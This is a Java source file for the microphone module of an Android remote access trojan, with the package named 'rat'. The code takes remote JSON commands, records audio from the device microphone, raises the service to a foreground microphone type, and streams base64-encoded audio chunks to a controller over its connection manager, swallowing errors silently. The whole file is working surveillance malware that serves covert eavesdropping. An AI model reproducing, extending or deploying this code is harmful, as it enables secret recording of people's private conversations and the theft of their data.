package com.wexow.rat.managers;

import android.content.pm.ServiceInfo; 
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.util.Base64;
import android.util.Log;

import com.wexow.rat.core.ConnectionManager;
import com.wexow.rat.core.MainService;

import org.json.JSONObject;

public class MicManager {
    private static final int CH = AudioFormat.CHANNEL_IN_MONO;
    private static final int FMT = AudioFormat.ENCODING_PCM_16BIT;

    private static AudioRecord rec;
    private static volatile boolean streaming = false;
    private static Thread thread;
    private static int rate = 11025;

    public static void handle(JSONObject jo) {
        try {
            String action = jo.optString("action", "start");
            if ("start".equals(action)) {
                rate = jo.optInt("sample_rate", 11025);
                start();
            } else stop();
        } catch (Exception ignored) {}
    }

    private static synchronized void start() {
        if (streaming) return;

        int buf = AudioRecord.getMinBufferSize(rate, CH, FMT);
        if (buf <= 0) return;

        try {
            try {
                if (MainService.getInstance() != null) {
                    MainService.getInstance().upgradeType(
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
                }
            } catch (Exception ignored) {}

            rec = new AudioRecord(MediaRecorder.AudioSource.MIC, rate, CH, FMT, buf);
            if (rec.getState() != AudioRecord.STATE_INITIALIZED) return;

            rec.startRecording();
            streaming = true;

            thread = new Thread(() -> {
                byte[] b = new byte[2048];
                while (streaming) {
                    int r = rec.read(b, 0, b.length);
                    if (r > 0) {
                        try {
                            String enc = Base64.encodeToString(b, 0, r, Base64.NO_WRAP);
                            JSONObject msg = new JSONObject();
                            msg.put("type", "mic_chunk");
                            msg.put("data", enc);
                            ConnectionManager.send(msg.toString());
                        } catch (Exception ignored) {}
                    }
                }
            });
            thread.start();
        } catch (Exception e) {
            Log.e("MicManager", "start: " + e.getMessage());
        }
    }

    public static synchronized void stop() {
        streaming = false;
        if (rec != null) {
            try {
                if (rec.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) rec.stop();
                rec.release();
            } catch (Exception ignored) {}
            rec = null;
        }
        thread = null;
    }
}
